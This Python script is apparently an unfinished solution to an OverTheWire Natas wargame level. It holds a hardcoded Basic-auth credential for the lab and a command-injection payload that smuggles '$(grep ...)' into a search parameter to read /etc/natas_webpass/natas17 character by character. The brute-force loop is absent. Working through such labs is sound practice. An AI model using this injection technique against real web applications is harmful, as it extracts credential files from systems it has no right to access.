#!/usr/bin/env python3

import requests
import json
import re
import base64
import sys

# natas17 solution

url = "http://natas16.natas.labs.overthewire.org/?needle=hello&submit=Search"
headers = {
"Authorization" : "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="
}

#grep -i "one$(grep ^hella file.txt)" dictionary.txt

query_prefix = "one$(grep ^"
password = ""
query_suffix = " /etc/natas_webpass/natas17)"
character_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

#curl -X POST https://www.hackthebox.eu/api/invite/generate

response = requests.get(url, headers=headers)
print(response)

# jsonResponse = response.json()
# code = jsonResponse["data"]["code"]
# decodedCode = base64.b64decode(code)
# print(decodedCode)
